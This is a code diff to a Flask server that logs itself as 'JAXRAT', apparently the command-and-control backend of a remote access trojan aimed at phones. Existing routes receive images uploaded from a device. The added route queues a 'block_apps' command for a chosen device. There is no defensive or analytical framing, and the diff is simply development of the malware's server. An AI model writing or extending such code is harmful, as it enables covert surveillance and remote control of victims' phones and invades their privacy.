@@ -102,6 +102,16 @@ def upload_image(device_id):
     filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
     file.save(filepath)
     return jsonify({"status": "success"})
+    
+@app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
+def set_blocked_apps(device_id):
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
+    data = request.json
+    apps = data.get("apps", "")
+    # Kirim perintah ke HP untuk update blocklist
+    latest_commands[device_id] = f"block_apps|{apps}"
+    print(f"[JAXRAT] Update App Blocker: {apps}")
+    return jsonify({"status": "success"})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
